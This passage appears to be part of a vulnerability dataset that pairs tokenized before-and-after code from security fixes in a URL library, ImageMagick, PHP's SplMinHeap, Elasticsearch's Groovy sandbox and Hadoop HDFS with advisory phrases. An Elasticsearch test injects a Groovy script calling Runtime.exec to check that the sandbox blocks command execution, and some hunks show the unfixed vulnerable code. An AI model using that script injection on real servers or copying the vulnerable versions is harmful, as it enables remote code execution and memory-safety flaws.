"(", "url", ")", "=", ">", "{", "followAllRedirects", ":", "true", "const", "urlParser", "=", "require", "(", "'", "url", "'", ")", "/", "/", "@", "todo", "drop", "the", "use", "of", "url", ".", "parse", "/", "/", "when", "support", "for", "node", "6", "is", "dropped", "/", "/", "eslint", "-", "disable", "-", "next", "-", "line", "const", "parsed", "=", "urlParser", ".", "URL", "?", "new", "urlParser", ".", "URL", "(", "ref", ")", ":", "urlParser", ".", "parse", "(", "ref", ")", "origin", ":", "'", "http", ":", "//", "www", ".", "google", ".", "com", "'", ",", "Origin", ":", "'", "http", ":", "//", "www", ".", "google", ".", "com", "'"], "docstring_tokens": ["sending", "a", "specially", "crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["{", "DestroyJNG", "(", "NULL", ",", "&", "color_image", ",", "&", "color_image_info", ",", "&", "alpha_image", ",", "&", "alpha_image_info", ")", ";", "ThrowReaderException", "(", "ResourceLimitError", ",", "\"", "MemoryAllocationFailed", "\"", ");", "}", "{", "DestroyJNG", "(", "chunk", ",", "&", "color_image", ",", "&", "color_image_info", ",", "&", "alpha_image", ",", "&", "alpha_image_info", ")", ";", "ThrowReaderException", "(", "CorruptImageError", ",", "\"", "NegativeOrZeroImageSize", "\"", ");", "}", "#", "Generated", "by", "GNU", "Autoconf", "2", ".", "69", "for", "ImageMagick", "7", ".", "0", ".", "8", "-", "6", ".", "PACKAGE_VERSION", "=", "'", "7", ".", "0", ".", "8", "-", "6", "'", "PACKAGE_STRING", "=", "'", "ImageMagick", "7", ".", "0", ".", "8", "-", "6", "'", "\\", "`", "configure", "'", "configures", "ImageMagick", "7", ".", "0", ".", "8", "-", "6", "to", "adapt", "to", "many", "kinds", "of", "systems", ".", "short", "|", "recursive", ")", "echo", "\"", "Configuration", "of", "ImageMagick", "7", ".", "0", ".", "8", "-", "6", ":", "\";", ";", "ImageMagick", "configure", "7", ".", "0", ".", "8", "-", "6", "It", "was", "created", "by", "ImageMagick", "$", "as_me", "7", ".", "0", ".", "8", "-", "6", ",", "which", "was", "VERSION", "=", "'", "7", ".", "0", ".", "8", "-", "6", "'", "MAGICK_PATCHLEVEL_VERSION", "=", "6", "MAGICK_VERSION", "=", "7", ".", "0", ".", "8", "-", "6", "MAGICK_GIT_REVISION", "=", "14516", ":", "c7537dd70", ":", "20180705", "This", "file", "was", "extended", "by", "ImageMagick", "$", "as_me", "7", ".", "0", ".", "8", "-", "6", ",", "which", "was", "ImageMagick", "config", ".", "status", "7", ".", "0", ".", "8", "-", "6</s>ThrowReaderException", "(", "ResourceLimitError", ",", "\"", "MemoryAllocationFailed", "\"", ");", "{", "DestroyJNG", "(", "chunk", ",", "&", "color_image", ",", "&", "color_image_info", ",", "&", "alpha_image", ",", "&", "alpha_image_info", ")", ";", "ThrowReaderException", "(", "CorruptImageError", ",", "\"", "NegativeOrZeroImageSize", "\"", ");", "}", "#", "Generated", "by", "GNU", "Autoconf", "2", ".", "69", "for", "ImageMagick", "7", ".", "0", ".", "8", "-", "5", ".", "PACKAGE_VERSION", "=", "'", "7", ".", "0", ".", "8", "-", "5", "'", "PACKAGE_STRING", "=", "'", "ImageMagick", "7", ".", "0", ".", "8", "-", "5", "'", "\\", "`", "configure", "'", "configures", "ImageMagick", "7", ".", "0", ".", "8", "-", "5", "to", "adapt", "to", "many", "kinds", "of", "systems", ".", "short", "|", "recursive", ")", "echo", "\"", "Configuration", "of", "ImageMagick", "7", ".", "0", ".", "8", "-", "5", ":", "\";", ";", "ImageMagick", "configure", "7", ".", "0", ".", "8", "-", "5", "It", "was", "created", "by", "ImageMagick", "$", "as_me", "7", ".", "0", ".", "8", "-", "5", ",", "which", "was", "VERSION", "=", "'", "7", ".", "0", ".", "8", "-", "5", "'", "MAGICK_PATCHLEVEL_VERSION", "=", "5", "MAGICK_VERSION", "=", "7", ".", "0", ".", "8", "-", "5", "MAGICK_GIT_REVISION", "=", "14506", ":", "0e75f0a50", ":", "20180703", "This", "file", "was", "extended", "by", "ImageMagick", "$", "as_me", "7", ".", "0", ".", "8", "-", "5", ",", "which", "was", "ImageMagick", "config", ".", "status", "7", ".", "0", ".", "8", "-", "5"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially-crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["-", "SPL", ":", ".", "Fixed", "bug", "#", "69737", "(", "Segfault", "when", "SplMinHeap", ":", ":", "compare", "produces", "fatal", "error", ")", ".", "(", "Stas", ")", "for", "(", "i", "=", "heap", "-", ">", "count", ";", "i", ">", "0", "&", "&", "heap", "-", ">", "cmp", "(", "heap", "-", ">", "elements", "[", "(", "i", "-", "1", ")", "/", "2", "]", ",", "elem", ",", "cmp_userdata", "TSRMLS_CC", ")", "<", "0", ";", "i", "=", "(", "i", "-", "1", ")", "/", "2", ")", "{", "heap", "-", ">", "count", "+", "+;", "-", "-", "TEST", "-", "-", "Bug", "#", "69737", "(", "Segfault", "when", "SplMinHeap", ":", ":", "compare", "produces", "fatal", "error", ")", "-", "-", "FILE", "-", "-", "<", "?", "php", "class", "SplMinHeap1", "extends", "SplMinHeap", "{", "public", "function", "compare", "(", "$", "a", ",", "$", "b", ")", "{", "return", "-", "parent", ":", ":", "notexist", "(", "$", "a", ",", "$", "b", ")", ";", "}", "}", "$", "h", "=", "new", "SplMinHeap1", "(", ");", "$", "h", "-", ">", "insert", "(", "1", ")", ";", "$", "h", "-", ">", "insert", "(", "6", ")", ";", "?", ">", "=", "==", "DONE", "=", "==", "-", "-", "EXPECTF", "-", "-", "Fatal", "error", ":", "Call", "to", "undefined", "method", "SplMinHeap", ":", ":", "notexist", "(", ")", "in", "%", "s", "/", "bug69737", ".", "php", "on", "line", "%", "d</s>-", "Core", ":", "@", "@", "-", "249", ",", "9", "+", "249", ",", "10", "@", "@", "static", "void", "spl_ptr_heap_insert", "(", "spl_ptr_heap", "*", "heap", ",", "spl_ptr_heap_element", "elem", ",", "v", "for", "(", "i", "=", "heap", "-", ">", "count", "+", "+;", "i", ">", "0", "&", "&", "heap", "-", ">", "cmp", "(", "heap", "-", ">", "elements", "[", "(", "i", "-", "1", ")", "/", "2", "]", ",", "elem", ",", "cmp_userdata", "TSRMLS_CC", ")", "<", "0", ";", "i", "=", "(", "i", "-", "1", ")", "/", "2", ")", "{"], "docstring_tokens": ["triggering", "a", "failed", "SplMinHeap::compare", "operation"]}
{"contents": ["empty"], "code_tokens": ["this", ".", "sandboxed", "=", "settings", ".", "getAsBoolean", "(", "GROOVY_SCRIPT_SANDBOX_ENABLED", ",", "false", ")", ";", "@", "ElasticsearchIntegrationTest", ".", "ClusterScope", "(", "scope", "=", "ElasticsearchIntegrationTest", ".", "Scope", ".", "TEST", ",", "numDataNodes", "=", "0", ")", "public", "void", "testSandboxedGroovyScript", "(", ")", "throws", "Exception", "{", "int", "nodes", "=", "randomIntBetween", "(", "1", ",", "3", ")", ";", "Settings", "nodeSettings", "=", "ImmutableSettings", ".", "builder", "(", ")", ".", "put", "(", "GroovyScriptEngineService", ".", "GROOVY_SCRIPT_SANDBOX_ENABLED", ",", "true", ")", ".", "build", "(", ");", "internalCluster", "(", ").", "startNodesAsync", "(", "nodes", ",", "nodeSettings", ")", ".", "get", "(", ");", "client", "(", ").", "admin", "(", ").", "cluster", "(", ").", "prepareHealth", "(", ").", "setWaitForNodes", "(", "nodes", "+", "\"", "\")", ".", "get", "(", ");", "int", "nodes", "=", "randomIntBetween", "(", "1", ",", "3", ")", ";", "Settings", "nodeSettings", "=", "ImmutableSettings", ".", "builder", "(", ")", ".", "put", "(", "GroovyScriptEngineService", ".", "GROOVY_SCRIPT_SANDBOX_ENABLED", ",", "true", ")", ".", "build", "(", ");", "internalCluster", "(", ").", "startNodesAsync", "(", "nodes", ",", "nodeSettings", ")", ".", "get", "(", ");", "client", "(", ").", "admin", "(", ").", "cluster", "(", ").", "prepareHealth", "(", ").", "setWaitForNodes", "(", "nodes", "+", "\"", "\")", ".", "get", "(", ");", ".", "put", "(", "\"", "script", ".", "disable_dynamic", "\"", ",", "false", ")</s>this", ".", "sandboxed", "=", "settings", ".", "getAsBoolean", "(", "GROOVY_SCRIPT_SANDBOX_ENABLED", ",", "true", ")", ";", "@", "ElasticsearchIntegrationTest", ".", "ClusterScope", "(", "scope", "=", "ElasticsearchIntegrationTest", ".", "Scope", ".", "TEST", ")", "public", "void", "testSandboxedGroovyScript", "(", ")", "{", "try", "{", "client", "(", ").", "prepareSearch", "(", "\"", "test", "\"", ").", "setQuery", "(", "constantScoreQuery", "(", "scriptFilter", "(", "\"", "pr", "=", "Runtime", ".", "getRuntime", "(", ").", "exec", "(", "\\\"", "touch", "/", "tmp", "/", "gotcha", "\\", "\")", ";", "pr", ".", "waitFor", "(", ")\"", ").", "lang", "(", "\"", "groovy", "\"", "))", ").", "get", "(", ");", "fail", "(", "\"", "should", "have", "thrown", "an", "exception", "\"", ");", "}", "catch", "(", "SearchPhaseExecutionException", "e", ")", "{", "assertThat", "(", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", "+", "\"", "should", "not", "contained", "NotSerializableTransportException", "\"", ",", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", ".", "contains", "(", "\"", "NotSerializableTransportException", "\"", "),", "equalTo", "(", "false", ")", ");", "assertThat", "(", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", "+", "\"", "should", "have", "contained", "GroovyScriptCompilationException", "\"", ",", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", ".", "contains", "(", "\"", "GroovyScriptCompilationException", "\"", "),", "equalTo", "(", "true", ")", ");", "assertThat", "(", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", "+", "\"", "should", "have", "contained", "Method", "calls", "not", "allowed", "on", "[", "java", ".", "lang", ".", "Runtime", "]", "\",", "ExceptionsHelper", ".", "detailedMessage", "(", "e", ")", ".", "contains", "(", "\"", "Method", "calls", "not", "allowed", "on", "[", "java", ".", "lang", ".", "Runtime", "]", "\")", ",", "equalTo", "(", "true", ")", ");", "}"], "docstring_tokens": ["via", "a", "crafted", "script", "."]}
{"contents": ["empty"], "code_tokens": ["public", "interface", "Enum", "{", "int", "getLength", "(", ");", "}", "public", "int", "getLength", "(", ")", "{", "return", "LENGTH", ";", "}", "/", "/", "String", "table", "in", "the", "fsimage", "utilizes", "an", "expanded", "bit", "range", ".", "public", "static", "final", "String", "DFS_IMAGE_EXPANDED_STRING_TABLES_KEY", "=", "\"", "dfs", ".", "image", ".", "string", "-", "tables", ".", "expanded", "\"", ";", "public", "static", "final", "boolean", "DFS_IMAGE_EXPANDED_STRING_TABLES_DEFAULT", "=", "false", ";", "*", "*", "Note", ":", "this", "format", "is", "used", "both", "in", "-", "memory", "and", "on", "-", "disk", ".", "Changes", "will", "be", "*", "incompatible", ".", "*", "public", "enum", "AclEntryStatusFormat", "implements", "LongBitFormat", ".", "Enum", "{", "PERMISSION", "(", "null", ",", "3", ")", ",", "TYPE", "(", "PERMISSION", ".", "BITS", ",", "2", ")", ",", "SCOPE", "(", "TYPE", ".", "BITS", ",", "1", ")", ",", "NAME", "(", "SCOPE", ".", "BITS", ",", "24", ")", ";", "private", "static", "final", "FsAction", "[", "]", "FSACTION_VALUES", "=", "FsAction", ".", "values", "(", ");", "private", "static", "final", "AclEntryScope", "[", "]", "ACL_ENTRY_SCOPE_VALUES", "=", "AclEntryScope", ".", "values", "(", ");", "private", "static", "final", "AclEntryType", "[", "]", "ACL_ENTRY_TYPE_VALUES", "=", "AclEntryType", ".", "values", "(", ");", "return", "ACL_ENTRY_SCOPE_VALUES", "[", "ordinal", "]", ";", "return", "ACL_ENTRY_TYPE_VALUES", "[", "ordinal", "]", ";", "return", "FSACTION_VALUES", "[", "ordinal", "]", ";", "return", "getName", "(", "aclEntry", ",", "null", ")", ";", "}", "static", "String", "getName", "(", "int", "aclEntry", ",", "SerialNumberManager", ".", "StringTable", "stringTable", ")", "{", "SerialNumberManager", "snm", "=", "getSerialNumberManager", "(", "getType", "(", "aclEntry", ")", ");", "if", "(", "snm", "!", "=", "null", ")", "{", "int", "nid", "=", "(", "int", ")", "NAME", ".", "BITS", ".", "retrieve", "(", "aclEntry", ")", ";", "return", "snm", ".", "getString", "(", "nid", ",", "stringTable", ")", ";", "SerialNumberManager", "snm", "=", "getSerialNumberManager", "(", "aclEntry", ".", "getType", "(", "))", ";", "if", "(", "snm", "!", "=", "null", ")", "{", "int", "nid", "=", "snm", ".", "getSerialNumber", "(", "aclEntry", ".", "getName", "(", "))", ";", "aclEntryInt", "=", "NAME", ".", "BITS", ".", "combine", "(", "nid", ",", "aclEntryInt", ")", ";", "return", "toAclEntry", "(", "aclEntry", ",", "null", ")", ";", "}", "static", "AclEntry", "toAclEntry", "(", "int", "aclEntry", ",", "SerialNumberManager", ".", "StringTable", "stringTable", ")", "{", "return", "new", "AclEntry", ".", "Builder", "(", ")", ".", "setScope", "(", "getScope", "(", "aclEntry", ")", ")", ".", "setType", "(", "getType", "(", "aclEntry", ")", ")", ".", "setPermission", "(", "getPermission", "(", "aclEntry", ")", ")", ".", "setName", "(", "getName", "(", "aclEntry", ",", "stringTable", ")", ")", ".", "build", "(", ");", "private", "static", "SerialNumberManager", "getSerialNumberManager", "(", "AclEntryType", "type", ")", "{", "switch", "(", "type", ")", "{", "case", "USER", ":", "return", "SerialNumberManager", ".", "USER", ";", "case", "GROUP", ":", "return", "SerialNumberManager", ".", "GROUP", ";", "default", ":", "return", "null", ";", "}", "@", "Override", "public", "int", "getLength", "(", ")", "{", "return", "BITS", ".", "getLength", "(", ");", "/", "/", "used", "to", "enable", "/", "disable", "the", "use", "of", "expanded", "string", "tables", ".", "SerialNumberManager", ".", "initialize", "(", "conf", ")", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "INodeWithAdditionalFields", ".", "PermissionStatusFormat", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "SerialNumberManager", ".", "StringTable", ";", "/", "/", "the", "loader", "must", "decode", "all", "fields", "referencing", "serial", "number", "based", "fields", "/", "/", "via", "to", "<", "Item", ">", "methods", "with", "the", "string", "table", ".", "final", "StringTable", "stringTable", ")", "{", "return", "PermissionStatusFormat", ".", "toPermissionStatus", "(", "id", ",", "stringTable", ")", ";", "AclFeatureProto", "proto", ",", "final", "StringTable", "stringTable", ")", "{", "b", ".", "add", "(", "AclEntryStatusFormat", ".", "toAclEntry", "(", "v", ",", "stringTable", ")", ");", "XAttrFeatureProto", "proto", ",", "final", "StringTable", "stringTable", ")", "{", "b", ".", "add", "(", "XAttrFormat", ".", "toXAttr", "(", "v", ",", "value", ",", "stringTable", ")", ");", "/", "/", "the", "saver", "can", "directly", "write", "out", "fields", "referencing", "serial", "numbers", ".", "/", "/", "the", "serial", "number", "maps", "will", "be", "compacted", "when", "loading", ".", "private", "static", "long", "buildPermissionStatus", "(", "INodeAttributes", "n", ")", "{", "return", "n", ".", "getPermissionLong", "(", ");", "private", "static", "AclFeatureProto", ".", "Builder", "buildAclEntries", "(", "AclFeature", "f", ")", "{", "b", ".", "addEntries", "(", "e", ")", ";", "private", "static", "XAttrFeatureProto", ".", "Builder", "buildXAttrs", "(", "XAttrFeature", "f", ")", "{", "int", "v", "=", "XAttrFormat", ".", "toInt", "(", "a", ")", ";", ".", "setPermission", "(", "buildPermissionStatus", "(", "file", ")", ")", "b", ".", "setAcl", "(", "buildAclEntries", "(", "f", ")", ");", "b", ".", "setXAttrs", "(", "buildXAttrs", "(", "xAttrFeature", ")", ");", ".", "setPermission", "(", "buildPermissionStatus", "(", "dir", ")", ");", "b", ".", "setAcl", "(", "buildAclEntries", "(", "f", ")", ");", "b", ".", "setXAttrs", "(", "buildXAttrs", "(", "xAttrFeature", ")", ");", ".", "setPermission", "(", "buildPermissionStatus", "(", "n", ")", ")", "private", "SerialNumberManager", ".", "StringTable", "stringTable", ";", "public", "SerialNumberManager", ".", "StringTable", "getStringTable", "(", ")", "{", "ctx", ".", "stringTable", "=", "SerialNumberManager", ".", "newStringTable", "(", "s", ".", "getNumEntry", "(", "),", "s", ".", "getMaskBits", "(", "))", ";", "ctx", ".", "stringTable", ".", "put", "(", "e", ".", "getId", "(", "),", "e", ".", "getStr", "(", "))", ";", "SerialNumberManager", ".", "StringTable", "stringTable", "=", "SerialNumberManager", ".", "getStringTable", "(", ");", ".", "setNumEntry", "(", "stringTable", ".", "size", "(", "))", ".", "setMaskBits", "(", "stringTable", ".", "getMaskBits", "(", "))", ";", "for", "(", "Entry", "<", "Integer", ",", "String", ">", "e", ":", "stringTable", ")", "{", ".", "newBuilder", "(", ").", "setId", "(", "e", ".", "getKey", "(", "))", ".", "setStr", "(", "e", ".", "getValue", "(", "))", ";", "/", "/", "Note", ":", "this", "format", "is", "used", "both", "in", "-", "memory", "and", "on", "-", "disk", ".", "Changes", "will", "be", "/", "/", "incompatible", ".", "enum", "PermissionStatusFormat", "implements", "LongBitFormat", ".", "Enum", "{", "String", "s", "=", "SerialNumberManager", ".", "USER", ".", "getString", "(", "n", ")", ";", "assert", "s", "!", "=", "null", ";", "return", "s", ";", "return", "SerialNumberManager", ".", "GROUP", ".", "getString", "(", "n", ")", ";", "final", "int", "user", "=", "SerialNumberManager", ".", "USER", ".", "getSerialNumber", "(", "assert", "user", "!", "=", "0", ";", "/", "/", "ideally", "should", "assert", "on", "group", "but", "inodes", "are", "created", "with", "null", "/", "/", "group", "and", "then", "updated", "only", "when", "added", "to", "a", "directory", ".", "final", "int", "group", "=", "SerialNumberManager", ".", "GROUP", ".", "getSerialNumber", "(", "static", "PermissionStatus", "toPermissionStatus", "(", "long", "id", ",", "SerialNumberManager", ".", "StringTable", "stringTable", ")", "{", "int", "uid", "=", "(", "int", ")", "USER", ".", "BITS", ".", "retrieve", "(", "id", ")", ";", "int", "gid", "=", "(", "int", ")", "GROUP", ".", "BITS", ".", "retrieve", "(", "id", ")", ";", "return", "new", "PermissionStatus", "(", "SerialNumberManager", ".", "USER", ".", "getString", "(", "uid", ",", "stringTable", ")", ",", "SerialNumberManager", ".", "GROUP", ".", "getString", "(", "gid", ",", "stringTable", ")", ",", "new", "FsPermission", "(", "getMode", "(", "id", ")", "))", ";", "}", "@", "Override", "public", "int", "getLength", "(", ")", "{", "return", "BITS", ".", "getLength", "(", ");", "}", "int", "n", "=", "SerialNumberManager", ".", "USER", ".", "getSerialNumber", "(", "user", ")", ";", "int", "n", "=", "SerialNumberManager", ".", "GROUP", ".", "getSerialNumber", "(", "group", ")", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "conf", ".", "Configuration", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "server", ".", "namenode", ".", "INodeWithAdditionalFields", ".", "PermissionStatusFormat", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "util", ".", "LongBitFormat", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Map", ".", "Entry", ";", "import", "static", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "DFSConfigKeys", ".", "DFS_IMAGE_EXPANDED_STRING_TABLES_DEFAULT", ";", "import", "static", "org", ".", "apache", ".", "hadoop", ".", "hdfs", ".", "DFSConfigKeys", ".", "DFS_IMAGE_EXPANDED_STRING_TABLES_KEY", ";", "/", "**", "Manage", "name", "-", "to", "-", "serial", "-", "number", "maps", "for", "various", "string", "tables", ".", "*", "/", "public", "enum", "SerialNumberManager", "{", "GLOBAL", "(", "),", "/", "/", "NEVER", "EVER", "directly", "access", "!", "USER", "(", "PermissionStatusFormat", ".", "USER", ",", "AclEntryStatusFormat", ".", "NAME", ")", ",", "GROUP", "(", "PermissionStatusFormat", ".", "GROUP", ",", "AclEntryStatusFormat", ".", "NAME", ")", ",", "XATTR", "(", "XAttrFormat", ".", "NAME", ")", ";", "private", "static", "final", "SerialNumberManager", "[", "]", "values", "=", "values", "(", ");", "private", "static", "final", "int", "maxEntryBits", ";", "private", "static", "final", "int", "maxEntryNumber", ";", "private", "static", "final", "int", "maskBits", ";", "private", "static", "boolean", "initialized", ";", "private", "SerialNumberMap", "<", "String", ">", "serialMap", ";", "private", "int", "bitLength", "=", "Integer", ".", "SIZE", ";", "private", "boolean", "enabled", ";", "static", "{", "maxEntryBits", "=", "Integer", ".", "numberOfLeadingZeros", "(", "values", ".", "length", ")", ";", "maxEntryNumber", "=", "(", "1", "<", "<", "maxEntryBits", ")", "-", "1", ";", "maskBits", "=", "Integer", ".", "SIZE", "-", "maxEntryBits", ";", "for", "(", "SerialNumberManager", "snm", ":", "values", ")", "{", "/", "/", "account", "for", "string", "table", "mask", "bits", ".", "snm", ".", "updateLength", "(", "maxEntryBits", ")", ";", "/", "/", "find", "max", "allowed", "length", "in", "case", "global", "is", "enabled", ".", "GLOBAL", ".", "updateLength", "(", "snm", ".", "getLength", "(", "))", ";", "}", "/", "/", "can", "reinitialize", "once", "later", ".", "initializeSerialMaps", "(", "DFS_IMAGE_EXPANDED_STRING_TABLES_DEFAULT", ")", ";", "}", "static", "synchronized", "void", "initialize", "(", "Configuration", "conf", ")", "{", "boolean", "useExpanded", "=", "conf", ".", "getBoolean", "(", "DFS_IMAGE_EXPANDED_STRING_TABLES_KEY", ",", "DFS_IMAGE_EXPANDED_STRING_TABLES_DEFAULT", ")", ";", "if", "(", "initialized", ")", "{", "if", "(", "useExpanded", "^", "!", "GLOBAL", ".", "enabled", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "Cannot", "change", "serial", "maps", "\"", ");", "}", "return", ";", "}", "initializeSerialMaps", "(", "useExpanded", ")", ";", "for", "(", "SerialNumberManager", "snm", ":", "values", ")", "{", "if", "(", "snm", ".", "enabled", ")", "{", "FSDirectory", ".", "LOG", ".", "info", "(", "snm", "+", "\"", "serial", "map", ":", "bits", "=", "\"", "+", "snm", ".", "getLength", "(", ")", "\"", "maxEntries", "=", "\"", "+", "snm", ".", "serialMap", ".", "getMax", "(", "))", ";", "}", "}", "initialized", "=", "true", ";", "}", "private", "static", "void", "initializeSerialMaps", "(", "boolean", "useExpanded", ")", "{", "if", "(", "useExpanded", ")", "{", "/", "/", "initialize", "per", "-", "manager", "serial", "maps", "for", "all", "but", "global", ".", "for", "(", "SerialNumberManager", "snm", ":", "values", ")", "{", "snm", ".", "enabled", "=", "(", "snm", "!", "=", "GLOBAL", ")", ";", "snm", ".", "serialMap", "=", "snm", ".", "enabled", "?", "new", "SerialNumberMap", "<", "String", ">", "(", "snm", ")", ":", "null", ";", "}", "}", "else", "{", "/", "/", "initialize", "all", "managers", "to", "use", "the", "global", "serial", "map", ".", "SerialNumberMap", "<", "String", ">", "globalSerialMap", "=", "new", "SerialNumberMap", "<", ">(", "GLOBAL", ")", ";", "for", "(", "SerialNumberManager", "snm", ":", "values", ")", "{", "snm", ".", "enabled", "=", "(", "snm", "=", "=", "GLOBAL", ")", ";", "snm", ".", "serialMap", "=", "globalSerialMap", ";", "}", "}", "}", "SerialNumberManager", "(", "LongBitFormat", ".", "Enum", ".", "..", "elements", ")", "{", "/", "/", "compute", "the", "smallest", "bit", "length", "registered", "with", "the", "serial", "manager", ".", "for", "(", "LongBitFormat", ".", "Enum", "element", ":", "elements", ")", "{", "updateLength", "(", "element", ".", "getLength", "(", "))", ";", "}", "}", "int", "getLength", "(", ")", "{", "return", "bitLength", ";", "}", "private", "void", "updateLength", "(", "int", "maxLength", ")", "{", "bitLength", "=", "Math", ".", "min", "(", "bitLength", ",", "maxLength", ")", ";", "}", "public", "int", "getSerialNumber", "(", "String", "u", ")", "{", "return", "serialMap", ".", "get", "(", "u", ")", ";", "}", "public", "String", "getString", "(", "int", "id", ")", "{", "return", "serialMap", ".", "get", "(", "id", ")", ";", "}", "public", "String", "getString", "(", "int", "id", ",", "StringTable", "stringTable", ")", "{", "return", "(", "stringTable", "!", "=", "null", ")", "?", "stringTable", ".", "get", "(", "this", ",", "id", ")", ":", "getString", "(", "id", ")", ";", "}", "private", "int", "getMask", "(", "int", "bits", ")", "{", "return", "ordinal", "(", ")", "<", "<", "(", "Integer", ".", "SIZE", "-", "bits", ")", ";", "}", "private", "static", "int", "getMaskBits", "(", ")", "{", "return", "GLOBAL", ".", "enabled", "?", "0", ":", "maskBits", ";", "}", "private", "int", "size", "(", ")", "{", "return", "enabled", "?", "serialMap", ".", "size", "(", ")", ":", "0", ";", "}", "private", "Iterable", "<", "Entry", "<", "Integer", ",", "String", ">", ">", "entrySet", "(", ")", "{", "if", "(", "!", "enabled", ")", "{", "return", "Collections", ".", "emptySet", "(", ");", "}", "return", "serialMap", ".", "entrySet", "(", ");", "}", "/", "/", "returns", "snapshot", "of", "current", "values", "for", "a", "save", ".", "public", "static", "StringTable", "getStringTable", "(", ")", "{", "/", "/", "approximate", "size", "for", "capacity", ".", "int", "size", "=", "0", ";", "for", "(", "final", "SerialNumberManager", "snm", ":", "values", ")", "{", "size", "+", "=", "snm", ".", "size", "(", ");", "}", "int", "tableMaskBits", "=", "getMaskBits", "(", ");", "StringTable", "map", "=", "new", "StringTable", "(", "size", ",", "tableMaskBits", ")", ";", "for", "(", "final", "SerialNumberManager", "snm", ":", "values", ")", "{", "final", "int", "mask", "=", "snm", ".", "getMask", "(", "tableMaskBits", ")", ";", "for", "(", "Entry", "<", "Integer", ",", "String", ">", "entry", ":", "snm", ".", "entrySet", "(", "))", "{", "map", ".", "put", "(", "entry", ".", "getKey", "(", ")", "|", "mask", ",", "entry", ".", "getValue", "(", "))", ";", "}", "}", "return", "map", ";", "}", "/", "/", "returns", "an", "empty", "table", "for", "load", ".", "public", "static", "StringTable", "newStringTable", "(", "int", "size", ",", "int", "bits", ")", "{", "if", "(", "bits", ">", "maskBits", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "String", "table", "bits", "\"", "+", "bits", "+", "\"", ">", "\"", "+", "maskBits", ")", ";", "}", "return", "new", "StringTable", "(", "size", ",", "bits", ")", ";", "}", "public", "static", "class", "StringTable", "implements", "Iterable", "<", "Entry", "<", "Integer", ",", "String", ">", ">", "{", "private", "final", "int", "tableMaskBits", ";", "private", "final", "Map", "<", "Integer", ",", "String", ">", "map", ";", "private", "StringTable", "(", "int", "size", ",", "int", "loadingMaskBits", ")", "{", "this", ".", "tableMaskBits", "=", "loadingMaskBits", ";", "this", ".", "map", "=", "new", "HashMap", "<", ">(", "size", ")", ";", "}", "private", "String", "get", "(", "SerialNumberManager", "snm", ",", "int", "id", ")", "{", "if", "(", "tableMaskBits", "!", "=", "0", ")", "{", "if", "(", "id", ">", "maxEntryNumber", ")", "{", "throw", "new", "IllegalStateException", "(", "\"", "serial", "id", "\"", "+", "id", "+", "\"", ">", "\"", "+", "maxEntryNumber", ")", ";", "}", "id", "|", "=", "snm", ".", "getMask", "(", "tableMaskBits", ")", ";", "}", "return", "map", ".", "get", "(", "id", ")", ";", "}", "public", "void", "put", "(", "int", "id", ",", "String", "str", ")", "{", "map", ".", "put", "(", "id", ",", "str", ")", ";", "}", "public", "Iterator", "<", "Entry", "<", "Integer", ",", "String", ">", ">", "iterator", "(", ")", "{", "return", "map", ".", "entrySet", "(", ").", "iterator", "(", ");", "}", "public", "int", "size", "(", ")", "{", "return", "map", ".", "size", "(", ");", "}", "public", "int", "getMaskBits", "(", ")", "{", "return", "tableMaskBits", ";", "}", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "private", "String", "name", ";", "private", "final", "int", "max", ";", "private", "final", "AtomicInteger", "current", "=", "new", "AtomicInteger", "(", "1", ")", ";", "SerialNumberMap", "(", "SerialNumberManager", "snm", ")", "{", "this", "(", "snm", ".", "name", "(", "),", "snm", ".", "getLength", "(", "))", ";", "}", "SerialNumberMap", "(", "String", "name", ",", "int", "bitLength", ")", "{", "this", ".", "name", "=", "name", ";", "this", ".", "max", "=", "(", "1", "<", "<", "bitLength", ")", "-", "1", ";", "}", "sn", "=", "current", ".", "getAndIncrement", "(", ");", "if", "(", "sn", ">", "max", ")", "{", "current", ".", "getAndDecrement", "(", ");", "throw", "new", "IllegalStateException", "(", "name", "+", "\"", ":", "serial", "number", "map", "is", "full", "\"", ");", "throw", "new", "IllegalStateException", "(", "name", "+", "\"", ":", "serial", "number", "\"", "+", "i", "+", "\"", "does", "not", "exist", "\"", ");", "int", "getMax", "(", ")", "{", "return", "max", ";", "}", "Set", "<", "Map", ".", "Entry", "<", "Integer", ",", "T", ">", ">", "entrySet", "(", ")", "{", "return", "new", "HashSet", "<", ">(", "i2t", ".", "entrySet", "(", "))", ";", "}", "public", "int", "size", "(", ")", "{", "return", "i2t", ".", "size", "(", ");", "}", "return", "\"", "current", "=", "\"", "+", "current", "+", "\"", ",\\", "n", "\"", "\"", "max", "=", "\"", "+", "max", "+", "\"", ",\\", "n", "t2i", "=", "\"", "+", "t2i", "+", "\"", ",\\", "n", "i2t", "=", "\"", "+", "i2t", ";", "*", "*", "Note", ":", "this", "format", "is", "used", "both", "in", "-", "memory", "and", "on", "-", "disk", ".", "Changes", "will", "be", "*", "incompatible", ".", "*", "public", "enum", "XAttrFormat", "implements", "LongBitFormat", ".", "Enum", "{", "RESERVED", "(", "null", ",", "5", ")", ",", "NS_EXT", "(", "RESERVED", ".", "BITS", ",", "1", ")", ",", "NAME", "(", "NS_EXT", ".", "BITS", ",", "24", ")", ",", "NS", "(", "NAME", ".", "BITS", ",", "2", ")", ";", "private", "static", "final", "int", 